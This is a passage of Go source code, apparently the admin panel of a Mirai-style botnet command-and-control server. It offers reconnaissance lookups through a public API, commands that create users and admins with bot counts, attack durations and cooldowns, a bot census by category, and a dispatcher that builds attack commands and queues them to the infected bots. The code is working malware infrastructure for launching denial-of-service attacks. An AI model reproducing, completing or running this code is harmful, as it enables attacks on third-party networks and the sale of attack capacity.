            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResponse\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-traceroute" || cmd == "-TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResults\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-resolve" || cmd == "-RESOLVE" {                  
            this.conn.Write([]byte("\x1b[1;93mURL (Without www.)\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-reversedns" || cmd == "-REVERSEDNS" {
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-asnlookup" || cmd == "-asnlookup" {
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-subnetcalc" || cmd == "-SUBNETCALC" {
            this.conn.Write([]byte("\x1b[1;93mIPv4\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-zonetransfer" || cmd == "-ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[1;93mIPv4 Or Website (Without www.)\033[93m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;93mResult\033[93m: \r\n\033[93m" + locformatted + "\x1b[37m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[93m- New User Info - \r\n- Username - \033[93m" + new_un + "\r\n\033[0m- Password - \033[93m" + new_pw + "\r\n\033[0m- Bots - \033[93m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[93m" + duration_str + "\r\n\033[0m- Cooldown - \033[93m" + cooldown_str + "   \r\n\x1b[1;93mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                               ║User Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username: \x1b[37m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;93m                               ║Are You Sure You Want To Remove \033[93m" + rm_un + "\x1b[1;93m?(y/n): \x1b[37m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[93m                                Unable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                                User Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "1admin" {
            this.conn.Write([]byte("\x1b[1;93m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;93m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[93m- New User Info - \r\n- Username - \033[93m" + new_un + "\r\n\033[0m- Password - \033[93m" + new_pw + "\r\n\033[0m- Bots - \033[93m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[93m" + duration_str + "\r\n\033[0m- Cooldown - \033[93m" + cooldown_str + "   \r\n\x1b[1;93mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;93m                               ║Admin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("                                \033[93m%s \x1b[37m[\033[93m%d\x1b[37m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[93m                                Total \x1b[37m[\033[93m%d\x1b[37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Failed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Bot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte("\033[37m                                ╚══\033[37m➢ \033[93mSENT!\r\n"))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
